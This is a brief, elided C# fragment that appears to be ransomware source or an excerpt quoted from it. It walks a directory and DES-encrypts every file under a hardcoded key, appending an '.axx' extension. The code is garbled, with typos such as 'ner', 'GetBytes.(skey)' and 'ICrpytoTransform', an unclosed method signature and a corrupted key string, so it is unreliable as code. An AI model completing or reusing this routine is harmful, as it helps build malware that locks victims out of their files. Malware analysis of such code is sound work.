...
private static void EncryptDir(string d,int mili)
    {
        DirectoryInfo dirtoencrypt = ner DirectoryInfo(d);
        FileInfo[] file;
        ...
        foreach (FileInfo currentFile in file)
        {
            ...
            {
                string key = "R?\n??i??";
                EncryptFile(currentFile.FullName, currentFile.FullName
                + ".axx", key);
...
string skey(
    {
        ...
        DES.Key = ASCIIEncoding.ASCIIEncoding.GetBytes(skey);
        DES.IV = ASCIIEncoding.ASCII.GetBytes.(skey);
        ICrpytoTransform desencrypt = DES.CreateEncryptor();
